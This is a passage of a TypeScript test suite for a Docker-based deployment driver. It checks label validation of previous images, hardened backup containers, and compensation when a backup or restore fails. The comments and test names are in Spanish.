      Config: { Labels: labels, User: '1001', Image: PREV_REF },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    };
  }

  function prevArgs() {
    return {
      projectId: PID,
      deploymentId: DID,
      candidateId: `cand-${DID.slice(0, 8)}`,
      previousLiveVersion: PREV_REF,
    } as never;
  }

  async function setupWithBuild(dataDir: string, db: Database.Database, stub: StubDocker) {
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    return d;
  }

  function runLabels(stub: StubDocker): Record<string, string> {
    const call = stub.calls.find((c) => c[0] === 'run')!;
    const out: Record<string, string> = {};
    for (let i = 0; i < call.length; i++) {
      if (call[i] === '--label' && i + 1 < call.length) {
        const v = call[i + 1]!;
        out[v.slice(0, v.indexOf('='))] = v.slice(v.indexOf('=') + 1);
      }
    }
    return out;
  }

  test('imagen de otro proyecto con nombre válido → rechazada, sin docker run', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    seedPrevImage(stub, { ...goodLabels(), 'com.appforge.project-id': '99999999-0000-4000-8000-000000000000' });
    const d = await setupWithBuild(dataDir, db, stub);
    const r = await d.startPreviousVersion(prevArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/PREVIOUS_IMAGE_UNTRUSTED/);
    expect(stub.calledWith('run')).toBe(false);
  });

  test('labels incompletas (sin fingerprint) → rechazada', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const labels = goodLabels();
    delete labels['com.appforge.source-fingerprint'];
    seedPrevImage(stub, labels);
    const d = await setupWithBuild(dataDir, db, stub);
    const r = await d.startPreviousVersion(prevArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/PREVIOUS_IMAGE_UNTRUSTED/);
    expect(stub.calledWith('run')).toBe(false);
  });

  test('deployment-id no UUID → rechazada', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    seedPrevImage(stub, { ...goodLabels(), 'com.appforge.deployment-id': 'no-es-uuid' });
    const d = await setupWithBuild(dataDir, db, stub);
    const r = await d.startPreviousVersion(prevArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/PREVIOUS_IMAGE_UNTRUSTED/);
  });

  test('rol distinto de live → rechazada', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    seedPrevImage(stub, { ...goodLabels(), 'com.appforge.role': 'verify' });
    const d = await setupWithBuild(dataDir, db, stub);
    const r = await d.startPreviousVersion(prevArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/PREVIOUS_IMAGE_UNTRUSTED/);
  });

  test('imagen inexistente → PREVIOUS_IMAGE_MISSING', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupWithBuild(dataDir, db, stub);
    const r = await d.startPreviousVersion(prevArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/PREVIOUS_IMAGE_MISSING/);
  });

  test('referencia válida con labels de otra imagen → PREVIOUS_IMAGE_IDENTITY_MISMATCH', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    seedPrevImage(stub, {
      ...goodLabels(),
      'com.appforge.deployment-id': 'eeeeeeee-dddd-4eee-8fff-000000000000',
    });
    const d = await setupWithBuild(dataDir, db, stub);
    const r = await d.startPreviousVersion(prevArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/PREVIOUS_IMAGE_IDENTITY_MISMATCH/);
    expect(stub.calledWith('run')).toBe(false);
  });

  test('imagen válida: el contenedor usa las labels REALES de la imagen anterior', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    seedPrevImage(stub, goodLabels());
    const d = await setupWithBuild(dataDir, db, stub);
    const liveVolume = projectLiveVolumeName(PID);
    stub.containerTemplate = liveInspect(goodLabels(), liveVolume);
    const r = await d.startPreviousVersion(prevArgs());
    expect(r.ok).toBe(true);
    const labels = runLabels(stub);
    // Las labels del deployment anterior, NO las del deployment fallido (DID).
    expect(labels['com.appforge.deployment-id']).toBe(PREV_DID);
    expect(labels['com.appforge.source-fingerprint']).toBe(FP);
    expect(labels['com.appforge.project-id']).toBe(PID);
    expect(labels['com.appforge.role']).toBe('live');
  });
});

describe('NO-GO2 B2: primer despliegue seguro y recuperación del live tras fallo de backup', () => {
  const LIVE = `appforge-app-${PID.slice(0, 8)}`;

  function liveLabels() {
    return {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.role': 'live',
    };
  }

  function backupArgs(prev: string | null = null) {
    return {
      projectId: PID,
      deploymentId: DID,
      candidateId: `cand-${DID.slice(0, 8)}`,
      previousLiveVersion: prev,
    } as never;
  }

  /** Construye el deployment y deja un live en marcha con app.db copiable. */
  async function setupLive(dataDir: string, db: Database.Database, stub: StubDocker) {
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    stub.containers.set(LIVE, {
      Config: {
        Labels: liveLabels(),
        User: '1001',
        Image: 'appforge/app-11111111:dep-aaaaaaaa-000000000000',
      },
      State: { Running: true },
    });
    const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'af-db-')), 'app.db');
    const sdb = new Database(p);
    sdb.exec('CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT); INSERT INTO t(v) VALUES (\'x\');');
    sdb.close();
    stub.hostFiles.set('app.db', fs.readFileSync(p));
    return d;
  }

  function mockHealthOk(d: DockerDeploymentDriver) {
    (d as unknown as { runHealthCheck: (a: never) => Promise<unknown> }).runHealthCheck = async () => ({
      ok: true,
      data: { version: '1' },
    });
  }

  function mockHealthFail(d: DockerDeploymentDriver) {
    (d as unknown as { runHealthCheck: (a: never) => Promise<unknown> }).runHealthCheck = async () => ({
      ok: false,
      code: 'HEALTH_CHECK_FAILED',
      error: 'unhealthy',
    });
  }

  function giveLiveFullIdentity(dataDir: string, stub: StubDocker) {
    const manifest = JSON.parse(
      fs.readFileSync(path.join(dataDir, 'deploy-snapshots', DID, '.appforge-manifest.json'), 'utf8'),
    ) as { fingerprint: string };
    const names = resourceNames(PID, DID, manifest.fingerprint);
    const live = stub.containers.get(LIVE) as {
      Config: { Labels: Record<string, string>; Image: string };
      State: { Running: boolean };
    };
    live.Config.Labels = {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': manifest.fingerprint,
    };
    live.Config.Image = names.image;
    return { live, names };
  }

  test('resumeCurrentLiveRuntime reanuda un live detenido y exige health antes de confirmar', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    const live = stub.containers.get(LIVE) as { State: { Running: boolean } };
    live.State.Running = false;
    mockHealthOk(d);

    const r = await d.resumeCurrentLiveRuntime(opArgs(PID, DID));

    expect(r.ok).toBe(true);
    expect(stub.calledWith('start', LIVE)).toBe(true);
    expect(live.State.Running).toBe(true);
  });

  test('resumeCurrentLiveRuntime con live ya activo comprueba health sin reiniciarlo', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    mockHealthFail(d);

    const r = await d.resumeCurrentLiveRuntime(opArgs(PID, DID));

    expect(r.ok).toBe(false);
    expect(r.code).toBe('HEALTH_CHECK_FAILED');
    expect(stub.calledWith('start', LIVE)).toBe(false);
  });

  test('resumeCurrentLiveRuntime rechaza un contenedor ajeno sin arrancarlo', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    const live = stub.containers.get(LIVE) as {
      Config: { Labels: Record<string, string> };
      State: { Running: boolean };
    };
    live.State.Running = false;
    live.Config.Labels['com.appforge.project-id'] = DID2;

    const r = await d.resumeCurrentLiveRuntime(opArgs(PID, DID));

    expect(r.ok).toBe(false);
    expect(r.code).toBe('FOREIGN_RESOURCE');
    expect(stub.calledWith('start', LIVE)).toBe(false);
    expect(live.State.Running).toBe(false);
  });

  test('backup manual y reanudación funcionan con un operation id sin snapshot', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    const operationId = '99999999-8888-4777-8666-555555555555';
    const args = {
      projectId: PID,
      deploymentId: operationId,
      candidateId: `cand-${operationId.slice(0, 8)}`,
    };

    const backup = await d.createLiveBackup({
      ...args,
      previousLiveVersion: 'appforge/app-11111111:dep-aaaaaaaa-000000000000',
    });
    expect(backup.ok).toBe(true);
    expect(backup.data?.backupValidated).toBe('true');
    expect(fs.existsSync(path.join(dataDir, 'deploy-snapshots', operationId))).toBe(false);

    mockHealthOk(d);
    const resumed = await d.resumeCurrentLiveRuntime(args);
    expect(resumed.ok).toBe(true);
    expect(stub.calledWith('start', LIVE)).toBe(true);
  });

  test('runCurrentLiveMigrations usa la imagen live inspeccionada y exige runtime detenido', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    const { live, names } = giveLiveFullIdentity(dataDir, stub);
    const operationId = '99999999-8888-4777-8666-555555555555';
    const args = {
      projectId: PID,
      deploymentId: operationId,
      candidateId: `cand-${operationId.slice(0, 8)}`,
    };

    const running = await d.runCurrentLiveMigrations(args);
    expect(running.ok).toBe(false);
    expect(running.code).toBe('LIVE_NOT_QUIESCED');

    live.State.Running = false;
    const migrated = await d.runCurrentLiveMigrations(args);
    expect(migrated.ok).toBe(true);
    const run = stub.calls.find((call) => call[0] === 'run' && call.includes(`appforge-mig-${operationId.slice(0, 8)}`));
    expect(run).toBeDefined();
    expect(run).toContain(names.image);
    expect(fs.existsSync(path.join(dataDir, 'deploy-snapshots', operationId))).toBe(false);
  });

  test('contenedor ausente + volumen live con datos → backup hadDatabase=true vía temporal endurecido', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, liveLabels());
    const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'af-db-')), 'app.db');
    const sdb = new Database(p);
    sdb.exec('CREATE TABLE t(id INTEGER PRIMARY KEY);');
    sdb.close();
    stub.hostFiles.set('app.db', fs.readFileSync(p));
    const r = await d.createLiveBackup(backupArgs());
    expect(r.ok).toBe(true);
    expect(r.data?.backupValidated).toBe('true');
    const created = (r.data as Record<string, string>).backupId;
    const m = JSON.parse(
      fs.readFileSync(path.join(dataDir, 'project-backups', PID, created, 'backup.json'), 'utf8'),
    ) as BackupManifest;
    expect(m.hadDatabase).toBe(true);
    expect(m.files.map((f) => f.name)).toContain('app.db');
    expect(r.data?.createdAt).toBe(m.createdAt);
    expect(r.data?.hadDatabase).toBe('true');
    expect(Number(r.data?.sizeBytes)).toBe(m.files.reduce((total, file) => total + file.size, 0));
    // El temporal se creó endurecido: sin red, read-only, cap-drop ALL,
    // usuario 1001, sin labels de managed (no es un recurso inventariado).
    const createCall = stub.calls.find((c) => c[0] === 'create' && c.includes('-v') && c.some((a) => a.startsWith(`${liveVolume}:/data`)));
    expect(createCall).toBeDefined();
    expect(createCall).toContain('--read-only');
    expect(createCall).toContain('--cap-drop=ALL');
    expect(createCall).toContain('--user');
    expect(createCall).toContain('1001');
    const netIdx = createCall!.indexOf('--network');
    expect(createCall![netIdx + 1]).toBe('none');
    expect(createCall!.includes('--label')).toBe(false);
    // El temporal se limpió.
    expect(stub.calledWith('rm')).toBe(true);
  });

  test('contenedor ausente + volumen live con labels ajenas → FOREIGN_RESOURCE sin backup', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, { 'otra': 'etiqueta' });
    const r = await d.createLiveBackup(backupArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/FOREIGN_RESOURCE/);
    expect(fs.existsSync(path.join(dataDir, 'project-backups', PID))).toBe(false);
    expect(stub.volumes.get(liveVolume)).toEqual({ 'otra': 'etiqueta' });
  });

  test('contenedor ausente + volumen live vacío → hadDatabase=false (no es primer despliegue, pero no hay datos)', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    stub.volumes.set(projectLiveVolumeName(PID), liveLabels());
    // Sin app.db en el volumen: el cp falla con "no such file".
    const r = await d.createLiveBackup(backupArgs());
    expect(r.ok).toBe(true);
    const created = (r.data as Record<string, string>).backupId;
    const m = JSON.parse(
      fs.readFileSync(path.join(dataDir, 'project-backups', PID, created, 'backup.json'), 'utf8'),
    ) as BackupManifest;
    expect(m.hadDatabase).toBe(false);
    expect(m.files).toEqual([]);
  });

  test('primer despliegue real (sin previous, sin contenedor, sin volumen) → hadDatabase=false', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const r = await d.createLiveBackup(backupArgs());
    expect(r.ok).toBe(true);
    const created = (r.data as Record<string, string>).backupId;
    const m = JSON.parse(
      fs.readFileSync(path.join(dataDir, 'project-backups', PID, created, 'backup.json'), 'utf8'),
    ) as BackupManifest;
    expect(m.hadDatabase).toBe(false);
    expect(m.files).toEqual([]);
  });

  test('previousLiveVersion sin contenedor ni volumen → LIVE_DATA_MISSING, nunca backup vacío', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const previous = `appforge/app-${PID.slice(0, 8)}:dep-bbbbbbbb-${'b'.repeat(12)}`;
    const r = await d.createLiveBackup(backupArgs(previous));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/LIVE_DATA_MISSING/);
    const root = path.join(dataDir, 'project-backups', PID);
    const manifests = fs.existsSync(root)
      ? fs.readdirSync(root).filter((entry) => fs.existsSync(path.join(root, entry, 'backup.json')))
      : [];
    expect(manifests).toEqual([]);
  });

  test('fallo de docker cp tras detener el live → se re-levanta con health y se devuelve el error original', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    mockHealthOk(d);
    stub.failNext(['cp'], 'fail', 'simulated cp failure');
    const r = await d.createLiveBackup(backupArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_CP_FAILED/);
    // El live se re-levantó: start llamado y contenedor en marcha.
    expect(stub.calledWith('start', LIVE)).toBe(true);
    const entry = stub.containers.get(LIVE) as { State: { Running: boolean } };
    expect(entry.State.Running).toBe(true);
    // No se escribió manifiesto de backup válido (el directorio puede existir vacío).
    const root = path.join(dataDir, 'project-backups', PID);
    const manifests = fs.existsSync(root)
      ? fs.readdirSync(root).filter((d) => fs.existsSync(path.join(root, d, 'backup.json')))
      : [];
    expect(manifests.length).toBe(0);
  });

  test('abort durante la copia tras detener el live → se recupera y se devuelve OPERATION_ABORTED', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    mockHealthOk(d);
    stub.failNext(['cp'], 'aborted');
    const r = await d.createLiveBackup(backupArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/OPERATION_ABORTED/);
    expect(stub.calledWith('start', LIVE)).toBe(true);
    const entry = stub.containers.get(LIVE) as { State: { Running: boolean } };
    expect(entry.State.Running).toBe(true);
  });

  test('señal original realmente abortada → la recuperación usa una señal independiente', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    mockHealthOk(d);
    const controller = new AbortController();
    stub.failWhen(
      (call) => {
        if (call[0] !== 'cp') return false;
        controller.abort();
        return true;
      },
      'aborted',
    );
    const r = await d.createLiveBackup({
      projectId: PID,
      deploymentId: DID,
      candidateId: `cand-${DID.slice(0, 8)}`,
      previousLiveVersion: null,
      signal: controller.signal,
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/OPERATION_ABORTED/);
    expect(controller.signal.aborted).toBe(true);
    const startIndex = stub.calls.findIndex((call) => call[0] === 'start' && call[1] === LIVE);
    expect(startIndex).toBeGreaterThanOrEqual(0);
    expect(stub.callSignals[startIndex]).not.toBe(controller.signal);
    expect(stub.callSignals[startIndex]?.aborted).toBe(false);
  });

  test('fallo de copia + recuperación sin health → BACKUP_RECOVERY_FAILED (servicio caído, se informa)', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupLive(dataDir, db, stub);
    mockHealthFail(d);
    stub.failNext(['cp'], 'fail', 'simulated cp failure');
    const r = await d.createLiveBackup(backupArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_RECOVERY_FAILED/);
    expect(r.error).toMatch(/BACKUP_CP_FAILED/);
  });
});

describe('NO-GO2 B3: restore failure-safe y propiedad del staging', () => {
  const BACKUP_ID = 'bk_test_001';
  const LIVE = `appforge-app-${PID.slice(0, 8)}`;
  const PREV_DID = 'dddddddd-eeee-4fff-8aaa-000000000000';
  const FP = 'd'.repeat(64);
  const PREV_REF = `appforge/app-${PID.slice(0, 8)}:dep-${PREV_DID.slice(0, 8)}-${FP.slice(0, 12)}`;

  function restoreArgs() {
    return { projectId: PID, deploymentId: DID, candidateId: `cand-${DID.slice(0, 8)}`, backupId: BACKUP_ID } as never;
  }

  /** Backup válido en disco (los datos NUEVOS a restaurar). */
  function makeValidBackup(dataDir: string): { bdir: string; bytes: Buffer } {
    const bdir = backupDirFor(dataDir, PID, BACKUP_ID);
    fs.mkdirSync(bdir, { recursive: true });
    const dbPath = path.join(bdir, 'app.db');
    const sdb = new Database(dbPath);
    sdb.exec("CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT); INSERT INTO t(v) VALUES ('nuevo');");
    sdb.close();
    const { size, sha256 } = sha256File(dbPath);
    const manifest: BackupManifest = {
      backupId: BACKUP_ID,
      projectId: PID,
      deploymentId: DID,
      createdAt: new Date().toISOString(),
      hadDatabase: true,
      files: [{ name: 'app.db', size, sha256 }],
    };
    writeBackupManifest(bdir, manifest);
    return { bdir, bytes: fs.readFileSync(dbPath) };
  }

  async function setupBuilt(dataDir: string, db: Database.Database, stub: StubDocker) {
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    return d;
  }

  function liveVolumeLabels() {
    return {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.role': 'live',
    };
  }

  /** Volumen live con los datos ORIGINALES (los que el rescate debe preservar). */
  function seedLiveVolumeWithData(stub: StubDocker): Buffer {
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, liveVolumeLabels());
    const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'af-db-')), 'app.db');
    const sdb = new Database(p);
    sdb.exec("CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT); INSERT INTO t(v) VALUES ('original-live-data');");
    sdb.close();
    const bytes = fs.readFileSync(p);
    let m = stub.volumeFiles.get(liveVolume);
    if (!m) {
      m = new Map();
      stub.volumeFiles.set(liveVolume, m);
    }
    m.set('app.db', bytes);
    return bytes;
  }

  function seedLiveContainer(stub: StubDocker) {
    stub.containers.set(LIVE, {
      Config: {
        Labels: liveVolumeLabels(),
        User: '1001',
        Image: 'appforge/app-11111111:dep-aaaaaaaa-000000000000',
      },
      State: { Running: false },
    });
  }

  function seedPrevImage(stub: StubDocker) {
    const id = 'sha256:' + '7'.repeat(64);
    const [repo, tag] = PREV_REF.split(':') as [string, string];
    const img = {
      id,
      repo,
      tag,
      labels: {
        'com.appforge.managed': 'true',
        'com.appforge.project-id': PID,
        'com.appforge.deployment-id': PREV_DID,
        'com.appforge.role': 'live',
        'com.appforge.source-fingerprint': FP,
      },
      os: 'linux',
      arch: 'amd64',
      user: '1001',
    };
    stub.images.set(PREV_REF, img);
    stub.images.set(id, img);
  }

  function goodLiveInspect(labels: Record<string, string>, liveVolume: string, imageRef: string) {
    return {
      Config: { Labels: labels, User: '1001', Image: imageRef },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    };
  }

  test('staging preexistente ajeno sobrevive y produce FOREIGN_RESOURCE', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    makeValidBackup(dataDir);
    const stagingVol = `appforge-restore-staging-${DID.slice(0, 8)}`;
    stub.volumes.set(stagingVol, { 'otra': 'etiqueta' }); // ajeno
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/FOREIGN_RESOURCE/);
    expect(stub.volumes.get(stagingVol)).toEqual({ 'otra': 'etiqueta' }); // sobrevive
    // El live no se tocó.
    expect(stub.calls.some((c) => c[0] === 'stop' || c[0] === 'kill')).toBe(false);
  });

  test('hadDatabase no booleano → rechazado antes de tocar nada', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bdir } = makeValidBackup(dataDir);
    const m = JSON.parse(fs.readFileSync(path.join(bdir, 'backup.json'), 'utf8')) as Record<string, unknown>;
    m.hadDatabase = 'yes';
    writeBackupManifest(bdir, m as unknown as BackupManifest);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, liveVolumeLabels());
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_MANIFEST_INVALID/);
    expect(stub.volumes.has(liveVolume)).toBe(true);
    expect(stub.calls.some((c) => c[0] === 'volume' && c[1] === 'rm')).toBe(false);
  });

  test('hadDatabase=false con files no vacío → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bdir } = makeValidBackup(dataDir);
    const m = JSON.parse(fs.readFileSync(path.join(bdir, 'backup.json'), 'utf8')) as BackupManifest;
    m.hadDatabase = false;
    writeBackupManifest(bdir, m);
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_MANIFEST_INVALID/);
  });

  /**
   * Fallo inyectado DESPUÉS de eliminar el live: la compensación recrea el
   * volumen y devuelve los datos rescatados (bytes idénticos a los
   * originales); la versión anterior puede arrancar sana con esos datos.
   */
  async function compensatedRestore(
    failDesc: string,
    inject: (stub: StubDocker, liveVolume: string) => void,
  ) {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    makeValidBackup(dataDir);
    const liveVolume = projectLiveVolumeName(PID);
    const originalBytes = seedLiveVolumeWithData(stub);
    seedLiveContainer(stub);
    seedPrevImage(stub);
    inject(stub, liveVolume);
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RESTORE_FAILED_COMPENSATED/);
    // El volumen live existe de nuevo con los datos ORIGINALES (rescatados).
    expect(stub.volumes.has(liveVolume)).toBe(true);
    const after = stub.volumeFiles.get(liveVolume)?.get('app.db');
    expect(after).toBeDefined();
    expect(Buffer.compare(after!, originalBytes)).toBe(0);
    // La versión anterior arranca sana con esos datos.
    stub.containerTemplate = goodLiveInspect(
      {
        'com.appforge.managed': 'true',
        'com.appforge.project-id': PID,
        'com.appforge.deployment-id': PREV_DID,
        'com.appforge.role': 'live',
        'com.appforge.source-fingerprint': FP,
      },
      liveVolume,
      PREV_REF,
    );
    const prev = await d.startPreviousVersion({
      projectId: PID,
      deploymentId: DID,
      candidateId: `cand-${DID.slice(0, 8)}`,
      previousLiveVersion: PREV_REF,
    } as never);
    expect(prev.ok).toBe(true);
    return { dataDir, db, stub, d, failDesc };
  }

  test('fallo en volume create tras rm del live → compensación con datos originales', async () => {
    await compensatedRestore('volume create', (stub, liveVolume) => {
      stub.failWhen(
        (c) => c[0] === 'volume' && c[1] === 'create' && c[c.length - 1] === liveVolume,
        'fail',
        'simulated volume create failure',
      );
    });
  });

  test('fallo en la copia staging→live → compensación con datos originales', async () => {
    await compensatedRestore('copia a live', (stub) => {
      // El primer cp host→contenedor es host→staging; el segundo, host→live.
      let hostCpCount = 0;
      stub.failWhen(
        (c) => {
          if (c[0] === 'cp' && c[1] && !c[1].includes(':/data/') && path.basename(c[1]) === 'app.db') {
            hostCpCount++;
            return hostCpCount === 2;
          }
          return false;
        },
        'fail',
        'simulated copy failure',
      );
    });
  });

  test('fallo en la verificación final en el live → compensación con datos originales', async () => {
    await compensatedRestore('verificación final', (stub, liveVolume) => {
      stub.failWhen(
        (c, s) => {
          if (c[0] !== 'cp' || !c[1].startsWith('appforge-tmp-verify-')) return false;
          const cname = c[1].split(':/data/')[0]!;
          return s.containerVolumes.get(cname) === liveVolume;
        },
        'fail',
        'simulated verify failure',
      );
    });
  });

  test('live original vacío + fallo tras copia parcial → compensación restaura un volumen vacío', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    makeValidBackup(dataDir);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, liveVolumeLabels());
    seedLiveContainer(stub);
    stub.failWhen(
